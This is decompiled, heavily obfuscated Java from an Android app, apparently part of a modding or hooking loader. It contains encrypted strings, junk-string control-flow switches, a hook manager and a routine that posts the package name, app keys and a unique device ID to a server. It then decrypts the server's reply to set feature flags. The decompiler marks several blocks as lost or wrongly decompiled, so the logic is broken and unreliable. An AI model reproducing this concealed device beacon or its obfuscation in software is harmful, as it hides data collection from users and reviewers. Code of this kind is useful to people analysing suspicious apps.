package core.pro.android.notify;

import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Handler;
import android.os.Looper;
import android.os.Process;
import android.util.Base64;
import com.iqoocg.nm.fcRuQsQrcxOAzxwEalcM;
import com.shadow.okhttp3.CipherSuite;
import com.shadow.okhttp3.ConnectionSpec;
import com.shadow.okhttp3.MediaType;
import com.shadow.okhttp3.OkHttpClient;
import com.shadow.okhttp3.Request;
import com.shadow.okhttp3.RequestBody;
import com.shadow.okhttp3.Response;
import com.shadow.okhttp3.TlsVersion;
import gTBLD.dev.XSSTG.free.HookManager;
import gTBLD.dev.XSSTG.free.Utils;
import j$.util.Objects;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import org.json.JSONArray;
import org.json.JSONObject;

/* loaded from: /workspace/unpacked/classes2.dex */
public class v0 {
    public static volatile boolean a;
    public static JSONObject b;
    public static boolean c;
    public static final String d;
    public static final String e;
    public static final String f;

    static {
        String str = "ۨۖۦۘۙۗ۫ۜۢۨۘۗۨۘۛۧۨۘۡۨۥۘۤۖۡۢۡۘۖۥۜ۬ۗۙۧ۬ۜۘۜۖۧۘ۫ۜ۬ۙ۠ۗۜۗۚۗۙ";
        while (true) {
            switch ((((str.hashCode() ^ 353) ^ 268) ^ 549) ^ 1658161632) {
                case -1903813359:
                    c = false;
                    str = "ۖۘۥۦۤۦۙۥۡۧ۬ۨۘۜۢۗۙۖ۟۠ۖۜۘۙۚۚۗ۠ۥۨۜۜۡۘۨۨۤ";
                    break;
                case -1735707336:
                    return;
                case -665421293:
                    d = l2.decrypt("gCcDRU0n+CucOwNKVR3s\n", "809mKSF4iFk=\n");
                    str = "ۨۡ۬ۛۢۖۗۢۧۗۘۘۢ۬۟ۥ۠ۗۘ۬ۡۧ۬ۥۘۜۚۢۚ۬۫ۜۚۗۙ۬ۖ";
                    break;
                case 473519732:
                    a = false;
                    str = "ۤۖۨۘۘۡۖۡ۫ۤ۠۬ۚ۫ۚۜۙۦۘ۬۬ۦۙۙۜۢ۟ۡۧۙۜۡۖۤۢۖۛۗ۠۟ۥۥۥۘۧۢۘ۫ۘ";
                    break;
                case 499069486:
                    e = l2.decrypt("okXbO3le69WRV8c6VEj8\n", "ziSoTyYrmbk=\n");
                    str = "ۙۢۜۘۢۚۢ۫ۜۖۘۗۨۘۢۗۦۘۖۥۖۘۧۘۨۨۗۧۦ۫ۡۘۙۡۖۚۦۚ۬۬ۗۦ۫ۧۤ۠ۨۨ۫ۙۧ۬ۗۛۡۤ۬ۜۧ";
                    break;
                case 1370920634:
                    b = null;
                    str = "ۖۗۨۦۖ۫۟ۥۢۤۤۖ۠ۚۜۘۦ۫ۢۚۦۖۘ۠ۤ۠ۨۙ۫ۨۡۨۘۨۥۚۘۢ";
                    break;
                case 2029423610:
                    f = l2.decrypt("N1UNZ+L4H0kEXRB32PU=\n", "WzR+E72NbSU=\n");
                    str = "۬ۧ۬ۥۛۙۤۜۨۚۤۗۗۥۘۚ۬ۗۨۤ۫ۘ۟ۦۘۜۧ۫ۡ۟ۧ۫ۗۨۙۨۗ۫ۢ۟ۤۛۤۢۡۢ۠ۤۜۗۦ";
                    break;
            }
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:193:0x0557, code lost:
    
        r0 = "dFInjQ==\n";
        r1 = "BD1U+RTTEn0=\n";
     */
    /* JADX WARN: Code restructure failed: missing block: B:708:0x081e, code lost:
    
        continue;
     */
    /* JADX WARN: Code restructure failed: missing block: B:709:0x081e, code lost:
    
        continue;
     */
    /* JADX WARN: Failed to find 'out' block for switch in B:21:0x01b1. Please report as an issue. */
    /* JADX WARN: Failed to find 'out' block for switch in B:27:0x01bf. Please report as an issue. */
    /* JADX WARN: Failed to find 'out' block for switch in B:87:0x0318. Please report as an issue. */
    /* JADX WARN: Removed duplicated region for block: B:557:0x029d A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:593:0x01d2 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:594:0x0299 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:595:0x0b81 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:599:0x01c9 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:627:0x03cf A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:628:0x0404 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:629:0x0422 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:630:0x0425 A[SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:632:0x03ce A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static /* synthetic */ Boolean a(Context context, String str, String str2, CountDownLatch countDownLatch, boolean z, String[] strArr) throws PackageManager.NameNotFoundException, IOException {
        int iCode;
        boolean z2;
        String str3;
        int responseCode;
        String str4;
        String str5;
        String str6;
        boolean z3;
        try {
            String packageName = context.getPackageName();
            PackageManager packageManager = context.getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo(packageName, 0);
            String str7 = l2.decrypt("PGjUB8ClwX8=\n", "TAm3bKHCpEI=\n") + packageName + l2.decrypt("eMp7KNXZk+AB0n83w40=\n", "XrweWqaw/I4=\n") + packageInfo.versionName + l2.decrypt("aEpoCbEqvOMRX2Ifp34=\n", "TjwNe8JD040=\n") + packageInfo.versionCode + l2.decrypt("XOitV/SJ7g==\n", "eondJ53t05Q=\n") + fcRuQsQrcxOAzxwEalcM.APP_ID + l2.decrypt("TI7YQHC1qyo=\n", "au+oMBvQ0hc=\n") + fcRuQsQrcxOAzxwEalcM.APP_KEY + l2.decrypt("/Wh5aMM=\n", "2wMcEf45Tjg=\n") + fcRuQsQrcxOAzxwEalcM.KEY + l2.decrypt("4LaEY9I=\n", "xtLtB++ilRA=\n") + Utils.getUniqueDeviceId(context) + l2.decrypt("ynqEAkwkaeKIZ44uUTE5\n", "7An9cThBBL0=\n") + str + l2.decrypt("xdLlaXswaJSG0/5leDIK\n", "46GNDBdcN+I=\n") + l2.decrypt("WC4X\n", "aRgmQEoEbec=\n");
            k2.logToFloatingWindow(l2.decrypt("WjbA15kTxB8IX+C9wxi2\n", "v7lRPyykLLA=\n") + str2, l2.decrypt("StNxbg==\n", "I70XAQ+acTY=\n"));
            StringBuilder sb = new StringBuilder();
            boolean zEquals = Objects.equals(fcRuQsQrcxOAzxwEalcM.DNS_POOL, l2.decrypt("aOXpdLpOug==\n", "M8atOult53o=\n"));
            String str8 = "ۙۗۖۘۚۥۚۗۢۡۘ۬ۦۢۤۢۘۘۧۡۥۘۜۖۡۘۡۜۗۛۢۡۘۦۧۡۘۡۥۖۜۥۜۘۚۨۜۖۤۦۘۡ۬ۘۘۨ۠ۡۛۙۦ۠ۜۨۘ";
            while (true) {
                switch (str8.hashCode() ^ (-580753487)) {
                    case -1646982313:
                        str8 = "ۛۢۘۘۖۛۘۘۥ۫ۖۘۜۙۨۛۦۥۘۢۘۡۘۡۨۘۖ۠ۢۤۙ۬ۤۦۚۘۤۡۘ۬ۨۖۦۚ۫ۙۘۖۛۦۙۖۜۜ";
                    case -1028927132:
                        try {
                            OkHttpClient.Builder builderConnectionSpecs = new OkHttpClient.Builder().dns(new r0(str2, 1)).connectionSpecs(Collections.singletonList(new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS).tlsVersions(TlsVersion.TLS_1_3, TlsVersion.TLS_1_2).cipherSuites(CipherSuite.TLS_AES_128_GCM_SHA256, CipherSuite.TLS_AES_256_GCM_SHA384, CipherSuite.TLS_CHACHA20_POLY1305_SHA256, CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256).build()));
                            TimeUnit timeUnit = TimeUnit.SECONDS;
                            Response responseExecute = builderConnectionSpecs.connectTimeout(10L, timeUnit).readTimeout(10L, timeUnit).retryOnConnectionFailure(true).build().newCall(new Request.Builder().url(str2).post(RequestBody.create(str7, MediaType.parse(l2.decrypt("XMzh2IKBRfZU0/+bk89T9UqR99uZjwn3T9D02oiNQOdZ\n", "PbyRtOviJII=\n")))).build()).execute();
                            iCode = responseExecute.code();
                            String str9 = "ۖۖ۟ۙ۠ۦۜ۫ۙۦۦۙۚ۫ۘۘۙۖۤۦۦۤۚۧ۫ۜ۫ۘۚۤۨۘ";
                            while (true) {
                                switch (str9.hashCode() ^ (-783251451)) {
                                    case 9702954:
                                        String str10 = "ۤ۫۠۬۠ۥ۟ۢۘۜۥۖۛۤۘۙ۫ۖۨۖۤۗۚۨۜۗۙۥۦۥۘۜۦۨۧۜۘۘۘ۠ۢۜۡۥۘ";
                                        while (true) {
                                            try {
                                                switch (str10.hashCode() ^ 2035985304) {
                                                    case -1127979954:
                                                        str10 = "ۙۤ۠۟ۥۘۧۗ۬ۙۢۗۛۖۚ۠ۧۛۗۢۖۘۧۤۨ۬ۦۘۘۧۖ۠ۗ۠ۘۘۦ۠ۦۘ";
                                                    case -871792819:
                                                        break;
                                                    case -544050171:
                                                        String str11 = "ۜۘۖۘۙۚۥۘ۠ۛۡۚۜۨۚۥۘۛۧۥۘ۠۟۟ۤۡۜۘۥۛۥ۟۠ۘۨۥۨ۬ۗۗۥۘۘ۠ۚ";
                                                        while (true) {
                                                            switch (str11.hashCode() ^ (-1159358253)) {
                                                                case -250725376:
                                                                    str10 = "ۖۨۡۘۦۦۗۘۘۘۘۘ۫ۚ۬ۙۡۘۛۙۘ۠۫ۤ۟ۗۨۘۡ۫ۥۘۙۦۛ۠ۘۨ۫ۛۖۘ";
                                                                    continue;
                                                                case -178785663:
                                                                    str10 = "ۨۤۘۘۗ۠۠ۨۥۧ۠۬۫ۨۘۙۦۨۖۘ۟ۢۖۘۚۗۡۘۙۘۜۘۡۚۚۡۧ۟۫ۜ۟ۛۚۚۜۨۘ";
                                                                    continue;
                                                                case 355391137:
                                                                    str11 = "ۗۥۙۨۨۘۡۥۧۘۡۗۖۘۡۘۡۦۡۚۧ۫ۜۖۡ۟ۨۨۘ۠ۢۚۧۢۙ۫۬۟ۦ۠ۨۥۨۘ";
                                                                    break;
                                                                case 866241124:
                                                                    if (responseExecute.body() == null) {
                                                                        str11 = "ۙۖۖۢۡۡۜۖۡۘۨۚ۫ۘۨۡۚۦۜۦۜ۟ۙ۟ۚۦۘۘۡۜۚ۠ۤۗۚۤۘۘۗۛۦۘۚۗۖۘ۟۠ۜۘ۬ۙ۟ۧۨۦۘۦۢۧ";
                                                                        break;
                                                                    } else {
                                                                        str11 = "ۛۖۦۧۢۥۜۤ۟ۤۚۧۤۧۡ۟ۖۘ۟ۧۡۘۙۙۨۘۜ۟ۖۙ۬ۥۘۤۖۛۦۧۥۢۚۚۚۥۜۘۖۧۛۢۗۥۘ";
                                                                        break;
                                                                    }
                                                            }
                                                        }
                                                        break;
                                                    case -314319350:
                                                        sb.append(responseExecute.body().string());
                                                        z2 = true;
                                                        break;
                                                }
                                            } catch (Exception e2) {
                                                e = e2;
                                                k2.logToFloatingWindow(l2.decrypt("PQuioVJPpI9scZPEBnvWADM4laBYRamcWXKa/gZ71g==\n", "25ciRunHTCA=\n") + e.getMessage(), l2.decrypt("0ADJaPg=\n", "tXK7B4qTmWs=\n"));
                                                z2 = false;
                                                str3 = "ۗۨۨۨ۠ۖۘۜۘۦ۬ۡۧ۠ۧۥۘۜۙۖۢۖۨۘۤ۟ۥۘ۬ۖۢ۬۟ۡۘۘۡۦۢۤۖۧ۠ۦۘ۬۟ۖۘۤۥۙۖۛۘۘ۫ۜۘۥ۫۠";
                                                while (true) {
                                                    switch (str3.hashCode() ^ 319126116) {
                                                        case 197451499:
                                                            break;
                                                        case 341366531:
                                                            break;
                                                        case 900994736:
                                                            break;
                                                        case 954629675:
                                                            break;
                                                    }
                                                }
                                                System.out.println(l2.decrypt("t6NzKooun+vM6lpQAQ==\n", "XwzEzDuseFA=\n") + ((Object) sb));
                                                str4 = "۬ۘۛۛۧ۟ۙۦۥۙۡۦ۟ۗ۠ۘۖۥ۟ۜۥۥۘۡۚۨۤۜ۬ۘۜ۫ۘۘۡۚۙۨۜۚۥۦ۟";
                                                while (true) {
                                                    switch (str4.hashCode() ^ (-1151657083)) {
                                                        case -208726917:
                                                            break;
                                                        case -167785491:
                                                            break;
                                                        case 1038914178:
                                                            break;
                                                        case 1766387536:
                                                            break;
                                                    }
                                                }
                                            }
                                        }
                                        break;
                                    case 584250343:
                                        String str12 = "ۙۖۥۚۚۡۖ۟ۘ۬۫ۖۜۛۘۘۙ۫ۨۥۖۘۗۜۡۘۧۗ۠ۤۧ۫ۚۘۘ۬۬۟ۤۘۡۦۡۘۚۢۜۘۚۢۛۚۜۜۧ۟ۧ";
                                        while (true) {
                                            switch (str12.hashCode() ^ (-663456526)) {
                                                case 167220914:
                                                    str9 = "ۙ۠ۡۘۡ۫۬ۘۨ۠ۢ۫۟ۦۚۜۘۚ۫ۧۙ۬ۜ۫ۘۜۘ۬ۧۧۡۙۡۨۘۦ۬۟";
                                                    continue;
                                                case 668586480:
                                                    str12 = "ۧۜۖۘ۠ۜۘۜۗۙۘۦۦ۬ۙۡۜۛۘ۠۟۬ۗۧۨ۬۬ۙۛۗ۫ۢ۟ۖۘ۠ۥۧۘ۟ۖۨۡۧ۬ۨ۠ۨۘ۠۠ۘۘۢۗۥۘۧۨ۠";
                                                    break;
                                                case 1180599344:
                                                    str9 = "۟۬ۡۥۖۦ۟ۡۥۘۡۜۖۘۖۥۛۢ۠۠۫۫ۦۘۢۨۡۢۗۜۢ۠ۧ۠ۙۜۢۦ۟۠۟ۛۜ۟ۢ";
                                                    continue;
                                                case 1990220536:
                                                    if (iCode != 200) {
                                                        str12 = "ۜ۬ۡۘۦۦۨۘۤۢۖۘۢۨ۫ۙ۠ۗۖۤۦۘۢۨۨۦۜۦۘۥۨ۟۠ۘۚۜۛۨۘۦۘۘ۫ۡۨۘۢۨۦۘۖۘۖۘۗۙۦۘۛۛۥۗۥۖ";
                                                        break;
                                                    } else {
                                                        str12 = "ۢ۬ۨۘۜۧۗ۟ۘۘۜۗۘۨۨۡۘۖۨۡۘۗۢۨۥۡ۫۠ۜ۟ۦۚۙ۬ۖۤۘ";
                                                        break;
                                                    }
                                            }
                                        }
                                        break;
                                    case 1237123512:
                                        break;
                                    case 1550412243:
                                        str9 = "ۖ۟۟۟ۢ۫ۛ۬ۦۘۘۘۦۦۡۦۘۥۥۙۤۙۥۘۜۡۚۜۡ۬ۘۛ۠ۤ۬ۚۨۥ۫ۦۨۘ۬۟ۘۢۢۦۘۛۘۤۦۜۦۘۦۥۘ";
                                }
                            }
                        } catch (Exception e3) {
                            e = e3;
                            iCode = -1;
                        }
                        break;
                    case 863326299:
                        iCode = -1;
                        break;
                    case 1585762269:
                        String str13 = "۫ۛۖۘۤۙۙۘۤۘۘۢۚۦۘۦۘ۫۫ۙۡۘۘۗۡۘۘ۬ۤ۟ۦۗۗۗۘۘۡۘ۠۫ۡ";
                        while (true) {
                            switch (str13.hashCode() ^ (-1156216454)) {
                                case -1233438804:
                                    str8 = "ۢۧۧۙۙۡۘۗ۠ۤۗۨۛ۟ۘ۫ۖۙۤۨ۠ۘۢ۠ۘ۠ۥۘۦۗۤۨۚۡۤۨ۬";
                                    continue;
                                case -881973717:
                                    str13 = "ۧ۟ۦۘۘۨۤ۟ۢۜۘۛۦۦۘۢۛ۫ۤ۠ۧ۫ۦ۬ۦۗۨۘۖ۟۫ۙۧۘۘۖۡۚۛۥۖ۬ۡۛ۬ۦۧ۫ۙۨ۫ۖ۫";
                                    break;
                                case 253795805:
                                    str8 = "ۦۜۖۘۡۤۘۘۛۛۨۙۛۛ۠۫ۙۚۧۜ۬ۗۖۘۛۘۘۜۘۨۘ۠ۖۥۛۨۗۤۨۘۢۚۛۡۚۖ";
                                    continue;
                                case 1315778345:
                                    if (!zEquals) {
                                        str13 = "ۛۖۥۘۢۢۧ۠ۙۥۘۧۘ۫ۢ۬ۙ۬ۚۢۛۘ۬ۤۦۘ۫ۡۘۘۨۦۧۦۙۥۢۡ۫ۜۙ۠۫ۖۘ";
                                        break;
                                    } else {
                                        str13 = "ۘ۬۬ۚۡۦۡۡۨۖۗۦۢ۫ۥ۫ۤ۫ۗۗۡۘ۠ۦۤۜۤۦۘۥۜۙۚۗ۟ۥۖۖۘۘۦۖۘ۬ۡۦۘ";
                                        break;
                                    }
                            }
                        }
                        break;
                }
            }
            z2 = false;
            str3 = "ۗۨۨۨ۠ۖۘۜۘۦ۬ۡۧ۠ۧۥۘۜۙۖۢۖۨۘۤ۟ۥۘ۬ۖۢ۬۟ۡۘۘۡۦۢۤۖۧ۠ۦۘ۬۟ۖۘۤۥۙۖۛۘۘ۫ۜۘۥ۫۠";
            while (true) {
                switch (str3.hashCode() ^ 319126116) {
                    case 197451499:
                        String str14 = "ۗۧۡۘۘۧۘۥۥۨۗ۫ۤۗۢۙۘۘۨۧۖۘۛۗۜۘۗۤۘ۬ۡۘۥۗۖۡ۟ۥۘۛۡۡۤۧۗۘۚۛۖ۠ۘ";
                        while (true) {
                            switch (str14.hashCode() ^ (-104775019)) {
                                case -856301010:
                                    str14 = "۟ۜ۫ۢۧۥۜۙۖۗۘۚ۠ۨ۬ۛۙۚۢۙۢ۫۫۫۟ۗۗۛ۫ۖۘ";
                                    break;
                                case 178698290:
                                    str3 = "ۥ۠ۦۘ۠ۗۙۗۙۘۚۨۘۖۧۦۗۗۜۤۛۜۘۜ۫ۖۘۗۦۛۙۦۚۘۨۨۚۥۦۚۖۜۙۙۥۗۦۖۘۦۢۡۘ۟ۜۢۨۘ";
                                    continue;
                                    continue;
                                    continue;
                                case 874552507:
                                    if (!z2) {
                                        str14 = "ۜۧۥۘۚۨۘۙۡۘۜ۫ۦۛۜۡۛۙۧۥ۬ۖ۬ۤۜۘۖۘۢۡۖۦۡ۟۟۬ۦ۫۬۟";
                                        break;
                                    } else {
                                        str14 = "ۨۥۦۘ۬۫ۘۛۤ۬۠ۢۘۘ۫۫ۢ۫۫ۨۘۗۥۙۢ۠ۦۤۧۨۘۥۦۙۨۡۥ۬ۗ۬";
                                        break;
                                    }
                                case 1215290707:
                                    str3 = "ۤۚۧۥ۫۫ۦۜۥۜۜۛۡۘۨۧۗۤۨۤۨۧۛ۠۫ۨۜۢ۬ۡۘۖۛۨۡ۬ۘ";
                                    continue;
                            }
                        }
                        break;
                    case 341366531:
                        responseCode = iCode;
                        break;
                    case 900994736:
                        str3 = "ۘۘ۟ۘۚۖۥۥۘۢۤۘۖۨۖۘ۫ۨ۫ۡۜ۬۠ۦۥۘ۟ۖۢۖۡ۬ۢ۫ۘۤ۫۬";
                        continue;
                        continue;
                    case 954629675:
                        try {
                            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(str2).openConnection();
                            httpURLConnection.setRequestMethod(l2.decrypt("dG2zlw==\n", "JCLgw/n74Mg=\n"));
                            httpURLConnection.setConnectTimeout(10000);
                            httpURLConnection.setReadTimeout(10000);
                            httpURLConnection.setDoOutput(true);
                            httpURLConnection.setRequestProperty(l2.decrypt("WFNg3bWtVb9PRX7M\n", "GzwOqdDDIZI=\n"), l2.decrypt("DnHSCOURj/IGbsxL9F+Z8RgsxAv+H8PzHW3HCu8diuML\n", "bwGiZIxy7oY=\n"));
                            BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(httpURLConnection.getOutputStream());
                            bufferedOutputStream.write(str7.getBytes());
                            bufferedOutputStream.flush();
                            bufferedOutputStream.close();
                            responseCode = httpURLConnection.getResponseCode();
                            String str15 = "ۡۤۦۘۢۥۜۛ۬۟ۗۙۘۧۨ۫۠ۚۚ۟۠ۨۨ۟ۦۘۡۧ۠ۧۙۡ";
                            while (true) {
                                switch (str15.hashCode() ^ 229116711) {
                                    case -1549824790:
                                        str15 = "ۘ۫ۧۜ۠۠ۙۤۛۧۡۛ۠ۚۚۨۖ۫ۤۢۡۢ۠ۛۜ۠ۘۘۤۘ۬ۥۥ۠ۥۨۤۚۖۖۘۖۖ۬۬۠ۙ۬۟ۖۤۗ۠۟۠ۦۘ";
                                    case -1280002274:
                                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                                        while (true) {
                                            String line = bufferedReader.readLine();
                                            String str16 = "ۥ۫ۧۘ۟ۖ۠ۗۡ۠۬۠۟ۦۨۚۗۘۚۗۗۥ۟ۤ۠ۛۡ۟ۥۘ";
                                            while (true) {
                                                switch (str16.hashCode() ^ (-1882170692)) {
                                                    case -384901522:
                                                        str16 = "ۨۜۗۘۗ۬ۢ۟ۖۗ۬ۤۡۗۦۘۧۘۘۦۙ۠ۤۡۗۙۥۜۥۘۥۘ۫ۧۡۘۧۛۙۘۘۤۡۘۨۚۛۜۘۛۨ";
                                                    case 114147459:
                                                        break;
                                                    case 1386733754:
                                                        break;
                                                    case 2045399794:
                                                        String str17 = "ۗۢۥۙۡ۟۬۬ۦۘۤۥۘ۬۬۫ۙۨۜ۠۟ۚۡ۠ۥ۫ۨ۟۫ۦ۟ۛۛ۟ۡۚ۟ۗۙۥۘۤ۫۬ۦۚ۫ۛۤۥ۠ۧ۟ۡۘ";
                                                        while (true) {
                                                            switch (str17.hashCode() ^ 1128809969) {
                                                                case -983801613:
                                                                    str17 = "ۛ۫۟ۧۖۢ۠ۚۜۢۡۗۨۨۥۡۘۤۙۨۖۢۨۧۤۨۖۧۢۡۗۘۘۤۨۦۘۚۨۨ۠ۨۘ";
                                                                case 291362931:
                                                                    str16 = "ۢۧ۟ۥۙۡۘ۟ۙۤ۫ۤ۬ۧۥۗۦۜۦۘۛ۬ۧ۫ۙۗۙۥۘۘۖۗۙ";
                                                                    break;
                                                                case 868065378:
                                                                    str16 = "۬ۙۖۘۙۥۢۦۢۡۥۛ۫ۥۛ۟ۧۗۗ۠ۡ۠ۚۢۨۨ۟ۢۗۧ۫۬ۥ۫ۚۡۚۨۘۘ۠ۥۘ";
                                                                    break;
                                                                case 1458210217:
                                                                    str17 = line != null ? "ۘۡۧۜۗۖۗۥۙۖ۠ۘۦۦ۟ۥۖۘ۟ۧۤۨۧۘۦۛۦ۠ۜۘۘۜۛۥۙۚۤۙۙۦۜ۠ۧ" : "ۙۤ۫۠ۖۡۚۥۖۘ۟ۜۨۘۧۤۥۨۖۜۘ۠۬ۜۘۛۜۢ۠ۧۥۤۤۨۘۧ۫ۦۙۤۡۘ";
                                                            }
                                                        }
                                                        break;
                                                }
                                                bufferedReader.close();
                                                httpURLConnection.disconnect();
                                                break;
                                            }
                                            sb.append(line);
                                        }
                                        break;
                                    case 1433596663:
                                        break;
                                    case 1716662308:
                                        String str18 = "ۖۤ۫ۗ۬ۖۜۘۚۤۦۖۘۖۛۛۤ۬ۘۘۜ۫ۨۘۗۥۢۨۥۧۘۢۢۨۘۛ۠ۙۨۤۢۥۡ۠۫ۢۚ";
                                        while (true) {
                                            switch (str18.hashCode() ^ 400953695) {
                                                case -1409006875:
                                                    str15 = "ۨۜۦۤۛ۫۠۬ۘۢ۠ۖۘۜۧۖۘۤۡۤ۟ۤۛ۬ۥۖۨۘۘۙۗۘۢۨۧۘۢۖۧۙۜۤۖۘ۠";
                                                    continue;
                                                case 488275259:
                                                    if (responseCode != 200) {
                                                        str18 = "ۧۧۤۗۜۡۜۥۘۘۗۖۤۧۥۛۧ۠ۚۖۚۨۥۗ۠ۗۢۥۘ۟ۖۙۨۜۘۡۖۖۘۖۚۦۘۚۘ۫ۥۨۧ۫ۢۧ";
                                                        break;
                                                    } else {
                                                        str18 = "ۛۛۜۙۥۘۘۚۖۚۤۜ۠ۨۦۢۚۜۜۢۡۘۙۥۥۡۛۖ۠ۥۤ۬ۡۘۢۥ۫ۜۡۥۛۖۘۘ";
                                                        break;
                                                    }
                                                case 623794459:
                                                    str15 = "ۜۡۘۘ۟ۙۚۦ۟ۗۨۡۨۘۜۧۖۘ۠۠۟ۘۥۨۘ۬ۥۡ۠ۚۘۚ۠ۚ۟ۥۢۚۚۘۘۚۚۚۗ۟ۦۘۚ۟ۦۘ۟ۛۦ۠۬ۛۖۙ۟";
                                                    continue;
                                                case 1634251380:
                                                    str18 = "ۜۨۨۥۘۜۘۧۦۜۦۗۦۜ۟ۥۗۧۜۘۨۧۦۡۜ۠ۙۘۘۡۡ۠ۨ۟ۥۘۜۜۧۘۧۡۚۘۦۧ";
                                                    break;
                                            }
                                        }
                                        break;
                                }
                            }
                        } catch (Exception e4) {
                            k2.logToFloatingWindow(l2.decrypt("tcqupoa65wjrl4fMzaKNQuTJ2fKy\n", "XHE2TigeD6c=\n") + str2 + l2.decrypt("7AucBMEqZ45weA==\n", "zOIInSmFyGE=\n") + e4.getMessage(), l2.decrypt("URxhTtk=\n", "NG4TIas+vyo=\n"));
                            return Boolean.FALSE;
                        }
                        break;
                }
            }
            System.out.println(l2.decrypt("t6NzKooun+vM6lpQAQ==\n", "XwzEzDuseFA=\n") + ((Object) sb));
            str4 = "۬ۘۛۛۧ۟ۙۦۥۙۡۦ۟ۗ۠ۘۖۥ۟ۜۥۥۘۡۚۨۤۜ۬ۘۜ۫ۘۘۡۚۙۨۜۚۥۦ۟";
            while (true) {
                switch (str4.hashCode() ^ (-1151657083)) {
                    case -208726917:
                        k2.logToFloatingWindow(l2.decrypt("wnupgbJUbYabPKrC7GoS\n", "KtQeZwPWiCI=\n") + str2 + l2.decrypt("43krSdgqL6BjHVd4pw==\n", "w5y4xD2Qu0c=\n") + responseCode, l2.decrypt("lLPibmM=\n", "8cGQARGsy80=\n"));
                        break;
                    case -167785491:
                        String str19 = "ۜۤ۟ۧ۬ۨۘ۬ۖۦۘۛۡۦۢۖ۠ۥۜۡۘ۟ۢۥۡۗ۠ۛۛۚۤ۠ۘۡۙۖۤۤۛۙۙۛۛ۟ۘۘ۠ۗۨ۫۟ۢ";
                        while (true) {
                            switch (str19.hashCode() ^ 1678215845) {
                                case -1145085578:
                                    if (responseCode != 200) {
                                        str19 = "ۨۡۡۚۖۦۡۚۘۘۨۚۨۘ۬ۙۡ۟۠ۗۡۢۤۚۦۥۡۚۘ۠۬۫ۦ۫ۥۜۢۘۗۧۘۘۨۡۚ";
                                        break;
                                    } else {
                                        str19 = "ۤ۠ۚۜ۫۠ۙۦۘۗۧۙۜۗۛۛ۠ۖۚ۬ۘۛۥۛۨۚۥۖۗۘۘۖ۟ۗۚۜۡۘۖۛۛۥۚۜ";
                                        break;
                                    }
                                case 2655556:
                                    str4 = "ۦۘۚۨۢۜۘۨۤۘۘۗۢۗۢۚۖ۟۬ۥۘۦ۠۠۟ۘ۟۠ۙ۫ۢۘۦۘ۠ۚۡۤۡ۫ۚۤۦۙۙ۟ۦۛۨۘۦۡۡۘۙ۬ۦۗۢۤ";
                                    continue;
                                case 796050420:
                                    str19 = "ۨۢۥۘۗۜۨۗۘ۬ۥۦۘ۬ۡۡۖ۟ۖۘۚ۠ۙۡۘ۠ۛۧ۟ۨ۟ۜ۬۟ۡۗۖۧۘ";
                                    break;
                                case 1382827567:
                                    str4 = "۫ۥۢۤ۠ۥۜۦۘۘۘۙۡۗۥۧۥۛ۫ۦۗ۫ۘ۟۫ۢۛۤۥۡۖۘۨۡ۫ۙۖ۟";
                                    continue;
                            }
                        }
                        break;
                    case 1038914178:
                        JSONObject jSONObject = new JSONObject(decrypt(sb.toString(), l2.decrypt("teswNPgH4J696WJirlWywA==\n", "hNkDAM0x16Y=\n")));
                        c = jSONObject.optBoolean(l2.decrypt("zYSgTjE=\n", "qeHCO1aUmsY=\n"), false);
                        boolean zOptBoolean = jSONObject.optBoolean(l2.decrypt("llWJvjNISeiXUom6PQ==\n", "9Dno3VgXOYk=\n"), false);
                        JSONArray jSONArrayOptJSONArray = jSONObject.optJSONArray(l2.decrypt("VE6YGATp/hBRdJ8mBe7+FF90gy4V8Q==\n", "OivvR2aFn3M=\n"));
                        String str20 = "۟ۚۦ۫ۘۨۘۧۡۘۘۛ۟ۥۘۤۡۦۧۛۗۥ۫ۥۘۦۧۜۥ۠ۡۥۘۖۖۢ۠ۧۥۨۧۥۨۘ۬ۤۦ۟ۥۘۘۗ۬ۗۚۥۘۘۘ۟ۜۘ";
                        while (true) {
                            switch (str20.hashCode() ^ (-235031516)) {
                                case -1298246990:
                                    str20 = "ۤۦۜۨۨ۬ۨۘۛۛۥۖۤۨۢۦۗ۠ۘۦۥۢۙۨۘۙۡۢۦۙۦ۠ۦ۠ۡۜۧۘۥ۠ۘۘۖ۬ۨۤ۬ۜۡ۟ۜۘۨۤۜ۟ۦ۫";
                                    break;
                                case -718023606:
                                    String str21 = "۬۠ۥۚ۟ۨۦۘۢۢۘۦۚۧ۫ۜۧۘۜۢۥۥۦۘ۬۫ۢۘۙ";
                                    while (true) {
                                        switch (str21.hashCode() ^ (-148603121)) {
                                            case -1399146850:
                                                String str22 = "ۜۥۜۘ۫۬ۜۖۦۨۘۙ۠۟ۖ۫ۦۙۖۖۘۤۧ۟ۜ۠۫ۦۧۘۘۛۨۜۤۢۥۘ۬ۗ۬";
                                                while (true) {
                                                    switch (str22.hashCode() ^ 161531865) {
                                                        case -1722762232:
